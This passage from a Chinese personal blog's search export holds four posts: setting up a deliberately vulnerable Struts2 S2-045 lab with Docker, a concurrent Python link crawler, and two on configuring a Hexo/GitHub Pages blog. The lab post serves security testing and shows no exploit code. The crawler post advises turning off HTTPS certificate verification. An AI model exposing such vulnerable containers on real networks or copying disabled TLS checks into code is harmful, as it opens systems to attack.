    <content type="text"><![CDATA[在进行安全测试的时候，经常需要搭建各种各样、不同配置的漏洞环境。有时候一天不到就能搞定，有时候两三天都没成功。后来发现一个神器:Docer，结合GitHub上面的漏洞靶场可以通过几条命令就能成功”搭建”一个漏洞环境。准备本文选用Debian作为操作环境。大家也可以根据自己的操作系统，安装对应Docker。大家可以去Docker官网查看如何安装，也可以去Docker中文看如何安装。安装Docker安装Docker之前需要在/etc/apt/sources.list文件中添加backports源。使用Vim命令。(下面所有命令建议在root权限下执行，要不然请在命令前加sudo。)1vim /etc/apt/sources.list添加deb http://http.debian.net/debian jessie-backports main，执行更新操作。1apt-get update成功更新之后，安装docker.io。1apt-get install docker.io查看Docker版本信息。1docker --version添加漏洞环境接下来就可以使用Docer添加对应的漏洞环境，那么漏洞环境在哪里找勒？这里我推荐两个地址:phith0h、Medicean。这里我以Struts2-S2-045为例：[S2-045][https://github.com/Medicean/VulApps/tree/master/s/struts2/s2-045]。将环境下载到本地，如果使用命令无法成功下载，那么多下载几次或者设置一下代理(你懂的)。1docker pull medicean/vulapps:s_struts2_s2-045下载完成之后，启动环境。-p后面的参数是将容器的端口映射到本机的端口，-p 80:8080就是将容器的8080端口映射到本机的80端口，可以自定义修改。1docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-045漏洞复现使用Exploit工具复现S2-045漏洞。Docker常用命令查看所有镜像。1docker images拉取镜像。1docker pull保存镜像。1docker save medicean/vulapps:s_struts2_s2-045 &gt; /tmp/s2-045.tar加载镜像。1docker load &lt; /tmp/s2-045.tar查看正在运行的容器。1docker ps停止容器，使用docker ps查看的id来停止对应容器。1docker stop ddedb0cd35e5启动容器。1docker start ddedb0cd35e5关闭容器。1docker kill ddedb0cd35e5删除镜像，如果不知道id可以使用Tab键来进行补全查看。1docker rm id总结使用Docker虽然可以快速的部署漏洞环境，但是这样不容易理解一些由于配置问题导致的漏洞。因此，建议在新漏洞出现之后使用Docker快速复现完成后，自己手工搭建一遍。]]></content>
      <categories>
        <category>安全研究</category>
        <category>漏洞环境搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
        <tag>Environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python-并发爬虫]]></title>
    <url>%2Farchives%2F426443e5.html</url>
    <content type="text"><![CDATA[现在数据就是王道，而爬虫就是获取数据的快速途径之一！准备看标题，咱们就应该知道需要用到Python27。本文通过Python 结合 requests库进行爬取操作，BeautifulSoup4使用lxml进行解析操作，gevent进行并发操作。Python27选择对应的操作系统的Python27进行下载。下载完成进行安装，之后配置环境变量即可。环境变量需要配置两处，一处是Python27的安装目录，一处是Python27安装目录下的Scripts目录。环境变量配置右键【我的电脑】→【属性】，点击【高级系统设置】中的【高级】选项卡中【环境变量】，在【系统变量】窗口中找到【Path】变量。点击【编辑】，加入对应的环境变量（例如D:\Code\Python27、D:\Code\Python27\Scripts）。如果是Win10系统，新建两条即可。如果是Win10等系统，点击编辑之后在后面加入;D:\Code\Python27;D:\Code\Python27\Scripts即可。1python --version1pip --versionRequests使用pip快捷安装requests。1pip install requestsBeautifulSoup使用pip快捷安装BeautifulSoup4。1pip install beautifulsoup4lxml使用pip快捷安装lxml。1pip install lxmlGevent使用pip快捷安装gevent。1pip install gevent爬取流程在准备阶段，咱们已经将“斧柄”、“斧刃”准备好了，到时候把两个组装起来，选一棵树，进行“伐木”工作。爬取流程分为：获得url、访问url、解析页面、获取页面url。入口url由于本文只爬取站点中存在的url，并不取特殊数据。因此，入口url可以自定义输入。1entry_url = raw_input('Place enter the entry url:')请求页面请求页面操作通过使用requests库来完成。如果对requests库感兴趣，可以参考官方文档。想要使用requests库，需要先导入requests库。这步操作就是将斧柄(Pythnon27)、斧刃(requests)组装起来。1import requests接下来就需要使用requests库的get方法。1r = requests.get(entry_url)解析页面通过上面的操作，咱们已经获取了页面的信息。然后就是BeautifulSoup4发挥的时候了。如果对BeautifulSoup4库感兴趣，可以参考官方文档1from bs4 import BeautifulSoup本文爬虫只需要获取站点url即可，不需要获取站点特殊数据。因此，获取a标签的href方法的值即可。123soup = BeautifulSoup(r.text, 'lxml')for i in soup.find('a'): get_url = i.get('href')异步爬取异步爬取可以让程序执行更快，时间既是生命。如果对gevent库感兴趣，可以参考官方文档。队列队列(Queue)适用于多线程编程，让数据安全地在生产者与消费者之间进行信息传递。让url放在队列数据结构中，可以让队列自动帮我们销毁已经被调用的url。123from gevent.queue import QueueurlQueue = Queue()异步工作将工作流程制作成函数，调用gevent.spawn形成工作队列。当适当的时候执行。12345import geventthreads=[]threads.append(gevent.spawn(work, **keyword))gevent.joinall(threads)总结在编写并发爬虫的时候，遇到了几个问题，在此记录一下。url请求是http还是https，如果是https的话，需要将requests的verify设置为False;并发的时候如何判断任务是否已经结束？我是通过判断队列为空并且无待工作的任务，不知道这种判断方式是否可取。有没有好心人告诉我有什么优雅的方式么;如果对并发量不进行设置的话，有可能导致内存飙高。我通过对线程列表进行设置，当线程列表到100时就运行一次。同求优雅的方式;href方法里面存在两种情况：包含域名(href=”http://xxx.com/index.html&quot;)，不包含域名(href=&quot;/index.html“);用户输入与href方法内情况不同。例如用户输入https://www.iassas.com，页面href标签是https://iassas.com（或者两者反一下）。现在就按照用户输入为准;子域名链接爬取，现在判断逻辑不爬取子域名;href方法中的url有可能会带有#(跳转对应页面位置)，模拟浏览器是将#后面所有字符不当成url考虑;url会被url编码，调用urllib.unquote来解码。完整代码完整代码已经上传到我的GiHub。如果有兴趣，不妨移步到Github上一观！Code。由于Web环境千奇百怪，程序出错在所难免。请体谅！]]></content>
      <categories>
        <category>Code</category>
        <category>Python27</category>
      </categories>
      <tags>
        <tag>Code</tag>
        <tag>Python27</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[博客配置]]></title>
    <url>%2Farchives%2F459ba203.html</url>
    <content type="text"><![CDATA[通过GitHub Page + Hexo(Next主题)搭建好博客之后，需要对站点配置文件、主题配置文件进行自定义配置。本篇文章对一些常用或需要自定义的配置进行描述。站点配置站点配置文件为全局配置文件，影响整个站点。文件路径:\根目录\_config.yml。基础配置站点基础配置包括标题、副标题、描述、作者、站点语言、URL设置等。通过对基础配置进行修改，就可以完成大部分的”轻度折腾”。标题标题会影响整站的标题，并且会在显示页面上。1title: 站点标题副标题副标题位于在主标题下，在Next主题中会被隐藏，需要通过修改\根目录\themes\next\source\css\_schemes\Mist\_logo.styl的.site-subtitile字段的display值或者在.site-subtitle前面加#进行注释。1subtitle: 站点副标题描述描述位于站点概览中，用最”简单”的语言描述一下最棒的自己。1description: 最简单的语言作者作者位于站点概览、版本声明等位置，留下自己的大名，让自己”声名远扬”吧！1author: 最棒的自己站点语言站点语言会影响整个站点的显示语言。支持简中、繁中、英文等。1language: zh-Hans|语言 |对应值 | |English |en | |简体中文 |zh-Hans | |法语 |fr-FR ｜ |繁体中文 |zh-hk/zh-tw｜ |俄语 |ru ｜ |德语 |de ｜ |葡萄牙语 |pt ｜ |日语 |ja ｜ URL设置URL设置包括url、enforce_ssl、root、permalink、permalink_default等字段。其中url字段设置为博客域名。根据博客所处目录设置root，如果为子目录，root需要进行对应修改。其余字段可保持不变。12url: 你的域名root: 站点所处目录其他配置分页设置分页设置主要修改per_page字段，可以对主页、档案、标签等进行每页显示文章数设置。1234567891011index_generator: path: '' per_page: 5 order_by: -datearchive_generator: per_page: 20 yearly: true monthly: truetag_generator: per_page: 10per_page: 10RSSRSS位于站点概览中，可以通过安装插件来完成，安装hexo-generator-feed。1npm install hexo-generator-feed --save安装插件之后，通过配置plugin字段加载插件。12plugin: - hexo-generator-feed对feed字段进行配置，如果不存在，则新建feed字段。123456feed: type: atom path: atom.xml limit: 10 hub: content:主题设置下载喜欢的主题，通过修改theme字段进行更换主题。Next主题下载，也可以在hexo提供的主题下载页面寻找喜欢的主题。1theme: next主题配置这里介绍Next的主题配置，主题配置文件文件路径:\根目录\themes\next\_config.yml。站标站标位于标签页左边,路径指向source目录下。建议ico大小为32x32。在线制作链接。1favicon: /iamges/favicon.ico社交社交位于站点概览，可以添加GitHub、知乎、微博、豆瓣等社交链接。12social: GitHub: https://github.com/hywell社交ico可以在图标库中查找，通过配置social_icons字段进行定义。123social_icons: enable: true GitHub: github打赏打赏位于每篇文章底部，可以添加微信、支付宝二维码，并设置感谢语。123reward_comment: 感谢语wechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg友链友情链接位于站点概览，可以设置links标题、友链名称、友链链接等。123links_title: 友情链接links: GitHub: https://github.com微信二维码微信二维码位于每篇文章底部。有朋自远方来，不亦乐乎！1234wechat_subscriber: enabled: true qcode: /images/wechat.jpg description: 有朋自远方来,不亦乐乎！版权版权信息位于每篇文章底部，表明作者、链接、版权声明。1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/结尾通过对以上参数进行配置，相信现在的博客已经开始呈现出一丝丝的与众不同了吧。生命在于折腾，折腾了博客搭建、折腾了博客配置，接下来开始折腾博客美化了。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建博客]]></title>
    <url>%2Farchives%2F5c83b0d3.html</url>
    <content type="text"><![CDATA[第一次搭建博客，一开始选用GitHub Page + jekyll 从网上找了许多模板，也自己去尝试写，发现总是不如人意。后来，改用GitHub Page + Hexo,套用Next主题满足了折腾的”愿望”。准备Hexo安装Hexo需要先安装Nodejs、Git。安装Git从Git官网下载对应系统版本进行安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1git --version查看对应版本，如果成功输出版本信息代表完成安装。安装Nodejs从Nodejs官网下载对应系统版本安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1npm -v查看对应版本，如果成功输出版本信息代表完成安装。安装hexo以管理员权限打开终端，进入对应目录（以E:\hexo为例）输入1E:\hexo&gt;npm install -g hexo安装途中出现会可能WARN不用担心。域名（可选）GitHub Page可以通过配置，让其可通过自定义域名进行访问（例如通过iassas.com即可访问我的博客）。建议通过GoDaddy申请，输入心仪的域名点击搜索域名。如果域名未被注册，将其添加到购物车。进入购物车进行付款。付款途中根据需要，添加增值服务。DNS解析（可选）为了让博客更好、更快地访问就需要配置DNS。建议通过DNSPOD申请，免费注册一个账户之后进入个人管理界面。选择左边菜单栏的[域名解析]，添加一个域名，输入自己的域名（例如iassas.com），点击确定。点击iassas.com进行配置，点击添加记录，共添加三条记录，添加以下信息进行保存即可。下述第三条www记录中的记录值需要输入对应的github.io（如果没有，请看下一小节）。| 主机记录 |记录类型 |线路类型 | 记 录 值 | | @ | A |默认 |192.30.252.153 | | @ | A |默认 |192.30.252.154 | | www | CNAME |默认 |user.github.io | 修改域名服务器，以GoDaddy结合DNSPOD为例。登陆GoDaddy，点击我的产品。选择对应的域名，点击DNS。在域名服务器项中，使用自定义域名服务器。配置如下| 域 名 服 务 器 | |f1g1ns1.dnspod.net | |f1g1ns2.dnspod.net | GitHub PageGitHub Page需要先注册一个GitHub账号GitHub。进入个人主页（例如https://github.com/hywell，是我的主页），点击右上角+号，点击New repository新建库。库名需要以账号名.github.io命名（例如hywell.github.io)，权限选择Public。点击下方Create repository建立库。建站创建博客打开终端，输入12E:\hexo&gt;hexo init blogE:\hexo&gt;npm install成功创建一个站点。进入站点目录，输入清理、编译、本地运行:123E:\hexo\blog&gt;hexo cleanE:\hexo\blog&gt;hexo gE:\hexo\blog&gt;hexo s这时候就可以通过浏览器访问127.0.0.1:4000，见证效果了！更换主题（可选）本博客套用Next主题，也可自行下载别的主题。打开终端，输入1E:\hexo\blog&gt;git clone https://github.com/iissnan/hexo-theme-next themes/next博客配置博客配置文件有站点配置文件、主题配置文件。站点配置文件为博客根目录下的_config.yml文件(E:\hexo\blog\_config.yml)，主题配置文件为\themes\主题_config.yml文件(E:\hexo\blog\themes\next\_config.yml)。需要注意的是在修改配置时，配置值前面需要加一个空格。以配置名: 配置值的形式，例如：title: blog。这里简要的介绍一些配置。站点配置修改主题，通过修改站点配置文件的theme字段，将其修改成对应的值 theme: next。修改站点标题，通过修改站点配置文件的title字段，将其修改成对应的值 title: Blog。修改站点语言，通过修改站点配置文件的language字段，将其修改成对应的值language: zh-Hans。修改时区，通过修改站点配置文件的timezone字段，将其修改成对应的值timezone: Asia/Shanghai。主题配置修改图标，通过修改主题配置文件的favicon字段，将其修改成对应的值favicon: /images/favicon.ico。这里的路径为/themes/next/source/images/favicon.ico，如果没有对应文件，则需要新建。修改头像，通过修改主题配置文件的avatar，将其修改成对应的值avatar: /upload/avatar.png。这里的路径为/themes/next/source/upload/avatar.png，如果没有对应文件，则需要新建。部署GitHub部署使用GitBash(\Git\git-bash.exe)配置身份信息，在GitBash中输入123git config --global user.name "yourname"git config --global user.email "youremail"ssh-keygen -t rsa -C "youremail"在用户目录下找到.ssh文件夹(C:\user\youname.ssh)，将id_rsa.pub中的密钥复制到GitHub-Setting-Key中。点击New SSH key，添加一个新的SSH key：输入任意title、将id_rsa.pub内容粘贴到Key中，最后点击 Add SSH key。登录GitHub。对刚刚新建的库（账号名.github.io）进行设置。将Custom domain设置为从GoDaddy申请的域名。站点部署配置站点配置文件的Deployment字段，将其修改。1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master如果出现Deployer not found，请输入1E:\hexo\blog\npm install hexo-deployer-git --save上传blog。123E:\hexo\blog\hexo cleanE:\hexo\blog\hexo gE:\hexo\blog\hexo d完成这时候通过账户名.github.io 或者 申请的域名即可访问你的博客了！！]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
